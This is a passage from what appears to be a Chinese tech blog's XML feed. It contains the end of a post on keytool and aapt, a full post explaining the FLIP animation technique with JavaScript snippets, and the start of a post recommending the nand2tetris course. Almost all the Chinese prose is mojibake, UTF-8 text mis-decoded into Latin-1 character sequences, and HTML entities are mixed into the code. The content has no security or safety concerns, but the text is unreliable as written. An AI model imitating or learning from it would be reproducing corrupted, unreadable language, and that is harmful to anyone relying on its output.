ç¸½çµä»Šå¤©é€™ç¯‡æ–‡ç« ç°¡å–®ä»‹ç´¹äº† keytool è·Ÿ aapt çš„ä½¿ç”¨ï¼Œä¸»è¦æ˜¯æƒ³è¦ä¸é  apktoolï¼Œåˆ©ç”¨å…¶ä»–å·¥å…·å–å‡ºæˆ‘å€‘æƒ³è¦çš„è³‡è¨Šï¼Œæ—¢çœæ™‚åˆçœåŠ›ã€‚
å¦‚æœä½ æœ‰èˆˆè¶£çŸ¥é“æœ€å¾Œåšå‡ºä¾†çš„æˆå“é•·æ€æ¨£ï¼Œapkinfo.sh æ˜¯æˆ‘æ”¾åœ¨ github ä¸Šé¢çš„ä¸€å€‹å°å°ˆæ¡ˆï¼Œç”¨é€”å°±è·Ÿé€™ç¯‡æ–‡ç« æ‰€æ•™çš„ä¸€æ¨£ï¼Œå°±æ˜¯å–å‡º apk çš„ç›¸é—œè³‡è¨Šã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>aapt</tag>
        <tag>keytool</tag>
        <tag>hashkey</tag>
      </tags>
  </entry>
  <entry>
    <title>FLIP æŠ€å·§ç¸½è¤‡ç¿’</title>
    <url>/2018/10/20/flip-your-animation/</url>
    <content><![CDATA[å‰è¨€åœ¨å‰ç«¯çš„ä¸–ç•Œä¸­ï¼Œå¦‚ä½•å„ªåŒ– performance ä¸€ç›´éƒ½æ˜¯å¾ˆé‡è¦çš„è­°é¡Œï¼Œä¹Ÿå¸¸å¸¸è¢«æ‹¿ä¾†ç•¶ä½œè©•æ–·å‰ç«¯å·¥ç¨‹å¸«èƒ½åŠ›çš„ä¸€å€‹ä¾æ“šã€‚æ•ˆèƒ½èª¿æ•™æœ‰è¨±å¤šæ–¹é¢å¯ä»¥æ¢è¨ï¼Œä½†æœ€ä¸»è¦çš„é‡é»å°±æ˜¯å¸Œæœ›ä½¿ç”¨è€…åœ¨æ“ä½œç¶²ç«™æ™‚ï¼Œä¸æœƒæ„Ÿå—åˆ°é é¢è·³å‹•ï¼Œå°¤å…¶æ˜¯ç•¶ç¶²ç«™æœ‰å‹•ç•«æ•ˆæœæ™‚ï¼Œäº›å¾®çš„è·³å‹•å°±æœƒå¼•èµ·ä½¿ç”¨è€…æ³¨æ„ã€‚
å¤§æ¦‚åœ¨å»å¹´çš„æ™‚å€™ï¼ŒåŒäº‹ç‚ºäº†è§£æ±º CSS Animation åœ¨é é¢ä¸Šçš„ä¸é †æš¢ï¼Œç ”ç©¶äº†ä¸å°‘ hack æŠ€å·§ï¼Œå…¶ä¸­ä¸€å€‹è®“æˆ‘è¦ºå¾—å¾ˆç‰¹åˆ¥çš„å°±æ˜¯ä»Šå¤©çš„ä¸»è§’ï¼šFLIPã€‚
FLIP æŠ€å·§å·²ç¶“å‡ºä¾†å¥½å¹¾å¹´äº†ï¼Œä½†æˆ‘ä¹Ÿæ˜¯å»å¹´æ‰çŸ¥é“ï¼Œä»Šå¤©é€™ç¯‡ç®—æ˜¯å€‹è¤‡ç¿’èˆ‡å›é¡§ï¼Œé †ä¾¿åˆ†äº«çµ¦é‚„ä¸çŸ¥é“æ­¤æŠ€å·§çš„è®€è€…ã€‚
ä»€éº¼æ˜¯ FLIPï¼Ÿç‚ºä»€éº¼æˆ‘å€‘éœ€è¦å®ƒï¼Ÿåœ¨é–‹å§‹ä»‹ç´¹ FLIP ä¹‹å‰ï¼Œå¿…é ˆå…ˆèªªæ˜ä¸€ä¸‹æˆ‘å€‘åœ¨è£½ä½œ CSS å‹•ç•«æ™‚ï¼Œå¯èƒ½æœƒé­é‡çš„æ•ˆèƒ½å•é¡Œã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä»Šå¤©æˆ‘å€‘æƒ³è¦è£½é€ ä¸€å€‹å¦‚ä¸‹æ•ˆæœçš„å‹•ç•«ï¼š
code link
æˆ‘å€‘é€šå¸¸æœƒéœ€è¦èª¿æ•´ DOM å…ƒç´ çš„ä½ç½®èˆ‡å¤§å°ï¼Œè€Œé€™é¡çš„æ“ä½œæœƒé€ æˆç€è¦½å™¨åµæ¸¬åˆ°æ½›åœ¨çš„ Layout æ”¹è®Šï¼Œè€Œé‡æ–°å¾ pixel pipeline çš„ Layout éšæ®µé–‹å§‹ reflow èˆ‡ repaintï¼Œè‹¥åŒæ™‚åœ¨é€™éšæ®µé€²è¡Œå…¶ä»– js æ“ä½œæˆ–æ˜¯é é¢äº’å‹•ï¼Œå°±æœƒé™ä½ fpsï¼Œä¹Ÿå°±ä»£è¡¨è‘—é é¢å¯èƒ½æœƒæ‰å¹€ï¼Œé€ æˆè¦–è¦ºä¸Šçš„è·³å‹•ã€‚
ç•¶ç„¶åœ¨ç›®å‰ç¡¬é«”è¨­å‚™è¶Šä¾†è¶Šå¼·å¤§çš„ç‹€æ…‹ä¸‹ï¼Œå…¶å¯¦åƒä¸Šåœ–ä¸­çš„å‹•ç•«å¾ˆé›£æœƒæœ‰å•é¡Œï¼Œä½†è‹¥æ˜¯èƒŒå¾Œæœ‰å…¶ä»–ç¹é‡çš„ js åœ¨é‹ä½œï¼Œé‚„æ˜¯æœ‰å¯èƒ½å‡ºç¾ä¸‹é¢é€™æ¨£çš„ fps ç‹€æ…‹ï¼š

è§£æ±ºæ–¹æ³•é€šå¸¸å°±æ˜¯è¦æƒ³è¾¦æ³•å°‡é€™é¡èŠ±è²»æ˜‚è²´çš„å‹•ç•«æ”¹ç”¨ transformã€opacity ä¾†è£½ä½œï¼Œè®“å‹•ç•«çš„é€²è¡Œèƒ½åœ¨ Composite éšæ®µé€²è¡Œå³å¯ï¼Œä¸é ˆå‹•åˆ° Layoutã€‚
é€™æ™‚å€™å°±å¯ä»¥å¼•å…¥ FLIP æŠ€å·§ä¾†å¹«å¿™äº†ï¼é€é FLIP å¯ä»¥å°‡é‚£äº›æœƒå°è‡´ Layout æ›´å‹•çš„å‹•ç•«ï¼Œè½‰æˆä»¥ transform é€™æ¨£çš„å±¬æ€§ä¾†é”æˆã€‚
FLIPå¦‚æœä½ ç›´æ¥ google æœå°‹ FLIPï¼Œå¯èƒ½æœƒæŸ¥åˆ°æ»‘æ¿æ•™å­¸ï¼›æœå°‹ FLIP CSSï¼Œæ‡‰è©²æœƒå‡ºç¾å¡ç‰‡ç¿»è½‰çš„å‹•ç•«æ•™å­¸ã€‚
é‚£åˆ°åº• FLIP è·Ÿç¶²é å‹•ç•«çš„å„ªåŒ–æœ‰ä»€éº¼é—œä¿‚å‘¢ï¼Ÿ
FLIP å…¶å¯¦æ˜¯å››å€‹å­—çš„çµ„åˆï¼šFirst, Last, Invert, Playï¼š

Firstï¼šåœ¨ FLIP æŠ€å·§ä¸­ï¼Œæˆ‘å€‘éœ€è¦å…ˆè¨˜éŒ„ä¸‹å‹•ç•«å…ƒä»¶çš„åˆå§‹ç‹€æ…‹ã€‚

Lastï¼šæ¥è‘—é€²è¡Œä¸€äº›é‹ç®—å¾Œï¼Œå¥—ç”¨å‹•ç•«çš„æœ€çµ‚ç‹€æ…‹åœ¨å‹•ç•«å…ƒä»¶ä¸Šï¼Œä¸¦ä¸”å°‡å®Œæˆå‹•ç•«å¾Œçš„ç‹€æ…‹è¨˜éŒ„ä¸‹ä¾†ã€‚

Invertï¼šFLIP æœ€ä¸»è¦çš„ hack å°±æ˜¯ç™¼ç”Ÿåœ¨é€™å€‹éšæ®µã€‚æ ¹æ“šå‰å…©å€‹æ­¥é©Ÿï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“è©²å‹•ç•«ç‰©ä»¶åœ¨å‹•ç•«æœŸé–“çš„ä½ç½®è®ŠåŒ–ï¼Œæ¥è‘—åˆ©ç”¨ transform èˆ‡ scaleï¼Œå°‡ç‰©ä»¶å¾å‹•ç•«çµå°¾ä½ç½®ç§»å‹•å›åˆå§‹ç‹€æ…‹çš„åœ°é»ã€‚

Playï¼šåœ¨æœ€å¾Œçš„æ­¥é©Ÿæ™‚ï¼Œå…ƒä»¶å·²ç¶“è¢«æˆ‘å€‘ transform å›èµ·å§‹é»äº†ï¼Œé€™æ™‚åªè¦å°‡ transform å±¬æ€§ç§»é™¤ï¼Œä¸¦åŠ ä¸Š transition çš„æ•ˆæœï¼Œæˆ‘å€‘å°±èƒ½å®Œç¾çš„æ¶ˆé™¤åŸå…ˆæ˜‚è²´çš„ Layout changeï¼Œæ”¹ä»¥èƒ½æ“æœ‰ç¨è‡ª Layer çš„ transform ä¾†è™•ç†å‹•ç•«æ•ˆæœã€‚


æ–‡å­—æ•˜è¿°å¯èƒ½ä¸å¤ å¥½æ‡‚ï¼ŒDavid Khourshid åšçš„é€™å€‹ç¯„ä¾‹æ‡‰è©²å°±èƒ½éå¸¸æ¸…æ¥šçš„èªªæ˜ FLIP åŸç†ï¼š
See the Pen How the FLIP technique works by David Khourshid (@davidkpiano) on CodePen.


è§£é‡‹èµ·ä¾†å…¶å¯¦æœƒç™¼ç¾è·Ÿ FLIP é€™å€‹å­—å…¶å¯¦ä¹Ÿæ˜¯å¾ˆå»åˆçš„ï¼ŒæŠŠå…ƒä»¶å¾çµæŸç‹€æ…‹ â€ç¿»â€œ å›åˆå§‹ç‹€æ…‹ã€‚
çœ‹åˆ°é€™é‚Šå¯èƒ½æœƒæœ‰äº›äººè¦ºå¾—å›°æƒ‘ï¼Œç‚ºä»€éº¼è¦é€™éº¼éº»ç…©ï¼Œä¸èƒ½ç›´æ¥ç”¨ transform æ­é… transition å°‡å…ƒä»¶ç§»å‹•è‡³çµæŸä½ç½®å—ï¼Ÿ
çš„ç¢ºæ˜¯å¯ä»¥ï¼Œä½†å¦‚æœä½ ä»Šå¤©æ˜¯è¦å„ªåŒ–åŸå…ˆå¯«å¥½çš„å‹•ç•«ï¼Œè®Šæˆè¦é‡æ–°æ‰‹å‹•è¨ˆç®— transform çš„ä½ç½®èˆ‡ scale çš„æ¯”ä¾‹ï¼Œæ˜¯ä»¶éº»ç…©çš„äº‹ï¼Œå€’ä¸å¦‚è®“ç€è¦½å™¨å¹«ä½ è™•ç†é€™éƒ¨åˆ†çš„è¨ˆç®—ï¼Œåªè¦ç®—å‡ºèµ·é»èˆ‡çµ‚é»ä½ç½®çš„å·®ç•°å³å¯ã€‚
æ­¤å¤–ï¼Œå°‡å…ƒä»¶å…ˆç§»è‡³çµæŸä½ç½®ï¼Œå† transform å›å»èµ·é»çš„æ–¹å¼ï¼Œå¯ä»¥è®“ç€è¦½å™¨å…ˆçŸ¥é“é€™å€‹å‹•ç•«æœƒèµ°çš„éç¨‹ï¼Œæ“šèªªæœ‰åŠ©æ–¼æ›´å¿«çš„è™•ç†å‹•ç•«ã€‚ï¼ˆä½†æˆ‘æ²’æœ‰å¯¦éš›æ¸¬è©¦éï¼Œä¸¦éç™¾åˆ†ç™¾ç¢ºå®šæœ‰é€™ç¨®æ•ˆæœï¼Œä¹Ÿæ­¡è¿å¤§å®¶å¹«å¿™è£œå……ï¼ï¼‰
æ¥è‘—æˆ‘å€‘å¯¦éš›åšåšçœ‹ä¾ç…§ FLIP åŸå‰‡ï¼Œæˆ‘å€‘å°‡ä¸€é–‹å§‹çš„å‹•ç•«åšé»èª¿æ•´ï¼š

Firstï¼š

// Fisrt: è¨˜éŒ„åˆå§‹ç‹€æ…‹const collapsed = elem.getBoundingClientRect();


Lastï¼š

// é€²è¡Œé‹ç®—, å¥—ç”¨å‹•ç•«çµå°¾çš„ css styleelem.classList.add(&#x27;expanded&#x27;);// Last: ç´€éŒ„çµæŸç‹€æ…‹const expanded = elem.getBoundingClientRect();


Invertï¼š

// INVERT// æ ¹æ“šåœ¨ F èˆ‡ L ç´€éŒ„çš„ä½ç½®ï¼Œæˆ‘å€‘ç®—å‡ºå…¶ä½ç½®å·®è· (top èˆ‡ left)const invertedTop = collapsed.top - expanded.top;const invertedLeft = collapsed.left - expanded.left;// å¤§å°çš„éƒ¨åˆ†å‰‡æ˜¯ç”¨å¯¬é«˜å·®å»è¨ˆç®— scale çš„æ¯”ä¾‹const invertedWidth = collapsed.width / expanded.width;const invertedHeight = collapsed.height / expanded.height;// è¨­å®š transform originï¼Œä»£è¡¨å‹•ç•«è¦å¾å“ªè£¡é–‹å§‹elem.style.transformOrigin = &#x27;top left&#x27;;// å°‡ç®—å¥½çš„å·®è· apply åˆ° transform å±¬æ€§ä¸Š// é€™æ¨£å°±èƒ½å°‡å…ƒä»¶ â€ç¿»â€œ å›åˆå§‹ä½ç½®elem.style.transform = &#x27;translate(&#x27; + invertedLeft + &#x27;px, &#x27; + invertedTop + &#x27;px) scale(&#x27; + invertedWidth + &#x27;, &#x27; + invertedHeight + &#x27;)&#x27;;


Playï¼š

// PLAY// åˆ©ç”¨ Rafï¼Œåœ¨ä¸‹å€‹ frame é–‹å§‹æ™‚å†åšå‹•ç•«requestAnimationFrame(function()&#123;  // è¨­å®š transitionï¼Œä¸¦ç§»é™¤ transformï¼Œè®“ä»–å† &quot;ç¿»&quot; åˆ°çµå°¾ä½ç½®  elem.style.transition = &#x27;550ms ease-out&#x27;;  elem.style.transform = &#x27;&#x27;;&#125;);elem.addEventListener(&#x27;transitionend&#x27;, function() &#123;  elem.style.transition = &#x27;&#x27;;&#125;);

ç¶“ç”± FLIP æŠ€å·§èª¿æ•´éå¾Œçš„å‹•ç•«ï¼š
See the Pen FLIP - good by Arvin (@arvin0731) on CodePen.


æˆ‘ä¸€é–‹å§‹çœ‹åˆ°é€™å€‹å¯¦ä½œæ™‚ï¼Œç¨å¾®æœ‰é»å›°æƒ‘ï¼Œè¦ºå¾—ç‚ºä»€éº¼å¯ä»¥ç›´æ¥å…ˆåŠ ä¸Šçµå°¾ç‹€æ…‹çš„ cssï¼Œè€Œä¸æœƒè®“å…ƒä»¶çœŸæ­£æ›´å‹•ï¼Ÿ
åŸå› å¾ˆç°¡å–®ï¼Œå°±åœ¨æ–¼é€™äº›å‹•ä½œæ˜¯åœ¨ç€è¦½å™¨ç¹ªè£½ä¸‹ä¸€å€‹ frame ä¹‹å‰å°±åšå®Œçš„ï¼Œåœ¨ç€è¦½å™¨çœŸæ­£éäº† 16msï¼Œè¦é–‹å§‹ç¹ªåœ–æ™‚ï¼Œæˆ‘å€‘å·²ç¶“ apply äº†å¦ä¸€å€‹ç¹ªåœ–éœ€æ±‚ï¼Œä¹Ÿå°±æ˜¯ transformã€‚æ‰€ä»¥ä¸¦ä¸æœƒçœ‹åˆ°å…ƒé–“è·‘åˆ°çµæŸä½ç½®çš„ç‹€æ³ã€‚
å¾ä¸‹é¢é€™å¼µåœ–æ‡‰è©²æœƒæ›´å¥½ç†è§£ï¼š
åœ–ç‰‡ä¾†æº
ä¸Šæ’é»‘è‰²ç®­é ­ä»£è¡¨æ¯ä¸€æ¬¡çš„ frame renderï¼Œä¸‹æ’å‰‡æ˜¯ç¹ªåœ–éœ€æ±‚ï¼Œè€Œç´…è‰²å¯ä»¥æƒ³åšæ˜¯æˆ‘å€‘è¨ˆç®—çµå°¾ä½ç½®çš„å‹•ä½œã€‚å¯ä»¥æ˜é¡¯çœ‹åˆ°ï¼Œåœ¨æ¯æ¬¡ç´…è‰²ç®­é ­çš„å¾Œé¢ï¼ŒçœŸæ­£é–‹å§‹ç¹ªåœ–å‰ï¼Œéƒ½æœ‰æ–°çš„ç¹ªåœ–éœ€æ±‚æœƒè“‹éå»ï¼Œå› æ­¤ç€è¦½å™¨ä¸¦ä¸æœƒæ¸²æŸ“ç´…è‰²ç®­é ­çš„éƒ¨åˆ†ã€‚
å¦å¤–é€™é‚Šè¦æ³¨æ„å…©ä»¶äº‹ï¼Œç¬¬ä¸€å€‹æ˜¯ Fã€Lã€I çš„æ™‚é–“éœ€è¦æŒæ§åœ¨ 100ms ä¹‹å…§ï¼Œæ ¹æ“š Paul Lewis çš„ FLIP ä»‹ç´¹æ–‡ç« ï¼Œä½¿ç”¨è€…åœ¨åšäº†äº’å‹•å¾Œï¼Œåˆ°æ„ŸçŸ¥å‹•ç•«çš„ç™¼ç”Ÿï¼Œé€™ä¸­é–“å¯ä»¥æœ‰ 100ms çš„ç©ºéš™ï¼Œæˆ‘å€‘åªè¦èƒ½åœ¨é€™ 100ms ä¸­å°‡åˆå§‹èˆ‡çµå°¾ä½ç½®è¨ˆç®—å®Œï¼Œä¸¦ç¿»å›åˆå§‹é»ï¼Œä½¿ç”¨è€…å°±ä¸æœƒæ„Ÿå—åˆ°ä»»ä½•å·®ç•°ã€‚
åœ–ç‰‡ä¾†æº
æœ€å¾Œï¼Œåœ¨é€™å€‹ä¾‹å­ä¸­ï¼Œæˆ‘éœ€è¦åˆ©ç”¨ transitionend é€™å€‹äº‹ä»¶ï¼Œåœ¨å‹•ç•«çš„æœ€å¾ŒæŠŠ transition æ‹¿æ‰ï¼Œå¦å‰‡ä¸‹ä¸€æ¬¡è¦è¨ˆç®—å‹•ç•«çµ‚é»ä½ç½®æ™‚ elem.classList.add(&#39;expanded&#39;);ï¼Œå°±æœƒç”¢ç”Ÿ transition æ•ˆæœï¼Œé‚£ä¸æ˜¯æˆ‘å€‘è¦çš„ã€‚
çµè«–FLIP æŠ€å·§çš„æ¦‚å¿µå¾ˆç°¡å–®ï¼Œä½†å¯¦ä½œèµ·ä¾†çš„ç¢ºæœƒå¢åŠ ä¸å°‘ç¨‹å¼ç¢¼ï¼Œä½†å¥½åœ¨æœ‰ä¸å°‘å¥—ä»¶å¯ä»¥ä½¿ç”¨ï¼Œä¹Ÿèƒ½æ­é… Web Animations API (polyfill) ä¾†é–‹ç™¼ã€‚æ¯”è¼ƒæ¨è–¦çš„æ˜¯ David Khourshid çš„ flipping.jsï¼Œä»–åœ¨å»å¹´ä¹Ÿæœ‰å¯«äº†ä¸€ç¯‡æ–‡ç« ä¾†ä»‹ç´¹ Animating Layouts with the FLIP Techniqueï¼Œå…¶ä¸­é‚„æœ‰è¬›åˆ°å¦‚ä½•å°‡ FLIP æ‡‰ç”¨åœ¨å…©å€‹ç¨ç«‹çš„å…ƒä»¶ä¸Šï¼Œå¯«å¾—å¾ˆæ£’å¾ˆæ¸…æ¥šï¼Œæ¨è–¦å¤§å®¶ç›´æ¥å»é–±è®€ï¼
è³‡æ–™ä¾†æº
Animating Layouts with the FLIP Technique
[javascript] requestAnimationFrame å„ªåŒ–å‹•ç•«æ•ˆç‡èˆ‡è³‡æº
FLIP Your 60 FPS Animations, FLIP â€™Em Good
FLIP Your Animations

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>animation</tag>
        <tag>css</tag>
        <tag>flip</tag>
      </tags>
  </entry>
  <entry>
    <title>From Nand To Tetrisï¼šæƒ³ç†è§£é›»è…¦é‹ä½œï¼Œå°±å…ˆåšå‡ºä¸€å°å§ï¼</title>
    <url>/2019/12/27/from-nand-to-tetris%EF%BC%9A%E6%83%B3%E7%90%86%E8%A7%A3%E9%9B%BB%E8%85%A6%E9%81%8B%E4%BD%9C%EF%BC%8C%E5%B0%B1%E5%85%88%E5%81%9A%E5%87%BA%E4%B8%80%E5%8F%B0%E5%90%A7%EF%BC%81/</url>
    <content><![CDATA[å‰è¨€ä¸€ç›´ä»¥ä¾†æˆ‘éƒ½å¾ˆæ¨è–¦ä¸€é–€èª²å«åš CS50ï¼ŒåŸå› æ˜¯åˆæ·±åˆå»£ï¼Œè€Œä¸”æ•™å¾—æ·±å…¥æ·ºå‡ºï¼Œä½œæ¥­åˆç´®å¯¦ï¼Œæ˜¯å¾ˆæ£’çš„ä¸€å ‚èª²ã€‚
è€Œä»Šå¤©è¦ä»‹ç´¹çš„é€™é–€èª²ï¼Œæˆ‘æœƒå½¢å®¹å®ƒæ˜¯ã€Œé›»è…¦åº•å±¤ç‰ˆçš„ CS50ã€ã€‚
From Nand to Tetris ç”±å…©ä½æ•™æˆ Shimon Schocken èˆ‡ Noam Nisan é–‹è¨­ï¼Œèˆ‡ CS50 ä¸€æ¨£ï¼Œä¸€é–‹å§‹éƒ½æ˜¯å¤§å­¸çš„èª²ç¨‹ï¼Œå¾Œä¾†æ‰è½‰ç‚ºç·šä¸Šèª²ç¨‹ï¼Œåœ¨å®˜ç¶²ä¸Šé€™å ‚èª²é‚„æœ‰ä¸€å€‹å‰¯æ¨™é¡Œï¼šã€ŒBuilding a Modern Computer From First Principlesã€ï¼Œæ²’éŒ¯ï¼Œè¦å»ºä¸€å°é›»è…¦å‡ºä¾†ã€‚
é€™å ‚èª²åˆ†ç‚ºå…©å€‹éƒ¨åˆ†ï¼ŒPart1 æ˜¯ From Nand To HACKï¼ŒNand æ˜¯ä¸€å€‹é‚è¼¯é–˜çš„åç¨±ï¼Œå°±åƒ Orã€Andã€Xor é€™äº›ä¹Ÿéƒ½æ˜¯é‚è¼¯é–˜ã€‚è€Œ HACK æ˜¯åœ¨ Part1 æœ€å¾Œæœƒå»ºé€ å‡ºä¾†çš„é›»è…¦ã€‚å› æ­¤ Part1 å°±æ˜¯å¸¶ä½ å¾æœ€åŸºæœ¬çš„é‚è¼¯é–˜é–‹å§‹ï¼Œä¸€æ­¥æ­¥æŠŠä¸€å°é›»è…¦å»ºç«‹å‡ºä¾†ï¼Œæ‰€ä»¥æ˜¯å¾ˆåå‘ç¡¬é«”çš„éƒ¨åˆ†ã€‚
Part2 å‰‡æ˜¯ From HACK To Tetrisï¼Œä»¥é›»è…¦ç‚ºåŸºç¤å¾€è»Ÿé«”å»å»¶ä¼¸ï¼Œæœƒä»‹ç´¹åˆ° Compiler èˆ‡ä½œæ¥­ç³»çµ±ç­‰ç­‰çš„è»Ÿé«”ã€‚


èª²ç¨‹çš„æ¦‚è§€å¯ä»¥åƒè€ƒé€™å¼µåœ–ç‰‡ï¼š

å¾çŸ¥é“é€™é–€èª²ä»¥ä¾†æˆ‘å°±ä¸€ç›´å¾ˆæƒ³ä¿®ä½†æ²’æœ‰ä»˜è«¸è¡Œå‹•ï¼Œå‰é™£å­çµ‚æ–¼èªçœŸäº†ä¸€æ®µæ™‚é–“æŠŠèª²ç¨‹ä¿®å®Œï¼Œåä¸è™›å‚³ï¼Œæœç„¶æ˜¯ä¸€é–€å¥½èª²ï¼å› æ­¤åœ¨é€™é‚Šå¯«ä¸€ç¯‡ä»‹ç´¹å…¼æ¨å‘æ–‡ï¼Œå¸Œæœ›èƒ½æ¨å»£çµ¦å¤§å®¶ã€‚
ç‚ºä»€éº¼æƒ³ä¿®é€™é–€èª²ï¼Ÿä¸ƒå¹´å‰æˆ‘é‚„æ˜¯å¤§ä¸€çš„æ™‚å€™ï¼Œå°±è·‘å»ä¿®äº†è³‡å·¥ç³»çš„ã€Œè¨ˆç®—æ©Ÿçµ„ç¹”èˆ‡çµ„åˆèªè¨€ã€é‚„æœ‰è³‡ç®¡ç³»çš„ã€Œè¨ˆç®—æ©Ÿçµ„ç¹”èˆ‡çµæ§‹ã€ï¼Œæœƒä¿®é€™å…©é–€èª²çš„åŸå› å¾ˆç°¡å–®ï¼Œå› ç‚ºæˆ‘æœ‰çµ„åˆèªè¨€æƒ…ç¯€ã€‚
é›–ç„¶èªªè‡ªå·±ä¸å¤ªæœƒå¯«çµ„èªï¼Œä½†è¦ºå¾—æœƒå¯«çµ„èªå¾ˆå¸¥ã€‚ä¸ç®¡æ˜¯ä»€éº¼ C++ã€Goã€Rust é‚„æ˜¯æˆ‘è‡ªå·±æœ€æ“…é•·çš„ JavaScriptï¼Œåœ¨æˆ‘å¿ƒç›®ä¸­éƒ½æ¯”ä¸éçµ„åˆèªè¨€ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“ç‚ºä»€éº¼ï¼Œä½†è¦ºå¾—æœƒå¯«çµ„èªå°±æ˜¯å¸¥ã€‚
ç‚ºäº†å­¸é‚„æœ‰å¯«çµ„åˆèªè¨€ï¼Œå°±ä¿®äº†é‚£å…©é–€èª²ã€‚é‚£å…©é–€èª²å‰åŠæ®µéƒ½åœ¨è¬›ä¸€äº›é›»è…¦æ¯”è¼ƒåº•å±¤çš„æ±è¥¿ï¼Œæˆ‘åˆ°ç¾åœ¨é‚„æ˜¯æ²’ææ‡‚ï¼Œå‰å…©æ¬¡ä½œæ¥­éƒ½æ‹¿äº†å¾ˆä½åˆ†ï¼Œé‚£äº›é›»è·¯åœ–å¾ä¾†æ²’çœ‹æ‡‚éï¼Œè€Œèª²ç¨‹å¾ŒåŠæ®µé€²å…¥åˆ°çµ„åˆèªè¨€ä¹‹å¾Œå°±å¦‚é­šå¾—æ°´äº†ï¼Œçµ‚æ–¼åˆ°æˆ‘å–œæ­¡ä¸”æ¯”è¼ƒæ“…é•·çš„ä¸»é¡Œã€‚
ç¸½ä¹‹å‘¢ï¼Œåœ¨é€™å…©é–€èª²ä¸Šé¢é™¤äº†çµ„åˆèªè¨€ä»¥å¤–ï¼Œæˆ‘å…¶å¯¦æ²’ä»€éº¼å¤ªå¤§çš„æ”¶ç©«ï¼Œå› ç‚ºå¥½å¤šæ±è¥¿éƒ½è½ä¸æ‡‚ã€‚ä¸Šå®Œä¹‹å¾Œï¼Œæˆ‘çŸ¥é“æœ‰ registerï¼Œæˆ‘çŸ¥é“æœ‰ L1 L2 cacheï¼Œæˆ‘çŸ¥é“æœ‰ branch predictionï¼Œä¹ŸçŸ¥é“ instruction pipelineï¼Œä½†æˆ‘é‚„æ˜¯ä¸çŸ¥é“é›»è…¦åˆ°åº•æ€éº¼åšçš„ï¼Œä¸çŸ¥é“æ€éº¼åŸ·è¡Œã€‚
ä½†å› ç‚ºä¹‹å¾Œæ²’æœ‰è¦è€ƒè³‡å·¥æ‰€ï¼Œå·¥ä½œä¸Šä¹Ÿç¢°ä¸åˆ°é€™éº¼åº•å±¤çš„æ±è¥¿ï¼Œå°±æ¼¸æ¼¸æ²’æœ‰å»æ³¨æ„äº†ã€‚å¯æ˜¯åœ¨æˆ‘å¿ƒè£¡ï¼Œé‚„æ˜¯æƒ³çŸ¥é“é›»è…¦åˆ°åº•æ€éº¼åšå‡ºä¾†çš„ã€‚
é•·å¤§ä»¥å¾Œç„¡æ„é–“è½èªªäº† From Nand To Tetrisï¼ˆä»¥ä¸‹ç°¡ç¨± nand2tetrisï¼‰é€™é–€èª²ç¨‹ï¼Œå¸¶ä½ å¾æœ€ç°¡å–®çš„é‚è¼¯é–˜é–‹å§‹ï¼ŒæŠŠé›»è…¦å»ºå‡ºä¾†ï¼Œç„¶å¾Œåœ¨é€™å°é›»è…¦ä¸Šè·‘ä¸€å€‹ä¿„ç¾…æ–¯æ–¹å¡Šçš„ç¨‹å¼ï¼Œå“‡ï¼Œè½èµ·ä¾†è¶…æ£’ã€‚
é€™å°±æ˜¯æˆ‘æƒ³ä¿®é€™é–€èª²çš„ç†ç”±ï¼Œæˆ‘æƒ³çŸ¥é“é›»è…¦åˆ°åº•æ€éº¼åšå‡ºä¾†çš„ã€‚æˆ‘æƒ³çŸ¥é“ CPU è£¡é¢åˆ°åº•æœ‰ä»€éº¼ï¼Œè€Œä¸åªæ˜¯ä¸€å€‹é»‘ç›’å­ã€‚
èª²ç¨‹åˆ°åº•ä¸Šäº†äº›ä»€éº¼ï¼Ÿèª²ç¨‹æœ‰å…­é€±ï¼Œåˆ†æˆä¸ƒå€‹å–®å…ƒï¼ˆå–®å…ƒ 0~6ï¼‰ï¼Œç¬¬ 0 å€‹å–®å…ƒæ˜¯èª²ç¨‹çš„ä»‹ç´¹ï¼Œåº•ä¸‹æˆ‘ç›´æ¥ä¾ç…§å„å€‹å–®å…ƒä¾†è·Ÿå¤§å®¶ä»‹ç´¹ã€‚
Unit0ï¼šèª²ç¨‹ä»‹ç´¹é€™å€‹å–®å…ƒé™¤äº†ä»‹ç´¹èª²ç¨‹ä»¥å¤–ï¼Œä¹Ÿä»‹ç´¹äº†å…©å€‹å¾ˆé‡è¦çš„æ¦‚å¿µï¼šAbstractionï¼ˆæŠ½è±¡ï¼‰èˆ‡ Implementationï¼ˆå¯¦ä½œï¼‰ã€‚
ç›´æ¥èˆ‰å€‹ä¾‹å­æœƒæ¯”è¼ƒå®¹æ˜“æ‡‚ï¼Œä¾‹å¦‚èªªä»Šå¤©çµ¦ä½ ä¸€å°é›»è…¦ï¼Œè¦ä½ åœ¨ä¸Šé¢å¯«å€‹è¼¸å‡º Hello World çš„ç¨‹å¼ï¼Œä½ ä¸ç”¨å»æ“”å¿ƒprintåˆ°åº•æ€éº¼æŠŠæ±è¥¿å°å‡ºä¾†ï¼Œä½ å¯ä»¥ç›´æ¥å‡è¨­å®ƒå°±æ˜¯æœƒå°å‡ºæ±è¥¿ã€‚æ›å¥è©±èªªï¼Œä½ ç„¡é ˆæ“”å¿ƒprintæ˜¯æ€éº¼è¢«å¯¦ä½œçš„ï¼ˆWhyï¼‰ï¼Œåªéœ€è¦çŸ¥é“å®ƒå¯ä»¥åšä»€éº¼å°±å¥½ï¼ˆWhatï¼‰ã€‚
